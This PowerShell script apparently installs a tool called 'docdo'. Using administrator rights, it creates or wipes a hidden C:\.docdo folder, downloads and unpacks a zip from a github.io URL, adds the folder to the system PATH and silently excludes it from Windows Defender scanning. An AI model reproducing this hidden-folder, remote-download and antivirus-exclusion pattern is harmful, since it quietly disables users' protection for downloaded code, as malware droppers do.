try {
	if ( ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).isInRole([Security.Principal.WindowsBuiltinRole]::Administrator) ) {
		$MAIN_DRIVE = "C:"
		$INCLUDE = Join-Path -Path $MAIN_DRIVE -ChildPath ".docdo"
		$INCLUDES = Join-Path -Path $INCLUDE -ChildPath "*.*"
		$REPOSITORY = Join-Path -Path $INCLUDE -ChildPath "Repository"
		$TEMPORARY = Join-Path -Path $INCLUDE -ChildPath "Temporary"
		if (-not (Test-Path $INCLUDE)) {
			New-Item $INCLUDE -ItemType Directory | Out-Null
			New-Item $REPOSITORY -ItemType Directory | Out-Null
			New-Item $TEMPORARY -ItemType Directory | Out-Null
		} else {
			Remove-Item $INCLUDES -Force -Recurse
		}
		$DIR=Get-Item $INCLUDE -Force
		$DIR.Attributes="Hidden"

		$down = New-Object System.Net.WebClient
		$url = 'https://docdolab.github.io/docdo.zip';
		$file = $INCLUDE, "docdo.zip" -join '\';
		$down.DownloadFile($url, $file);

		Expand-Archive -Path $file -DestinationPath $INCLUDE
		Remove-Item $file

		$OLDPATH = [System.Environment]::GetEnvironmentVariable('PATH','Machine').split(";")
		$bool = $false;
		foreach($old in $OLDPATH){
			if ($old -eq $INCLUDE){
				$bool = $old -eq $INCLUDE
			}
		}

		if ($bool -ne $true){
			$OLDPATH = [System.Environment]::GetEnvironmentVariable('PATH','Machine')
			$NEWPATH = "$OLDPATH;$INCLUDE"
			[Environment]::SetEnvironmentVariable("PATH", "$NEWPATH", "Machine")
		}
		Add-MpPreference -ExclusionPath $INCLUDE

		[System.Environment]::Exit(0)
	} else {
		Write-Output "Permission Error!"
	}
} catch {
	Write-Output "Init Error!"
}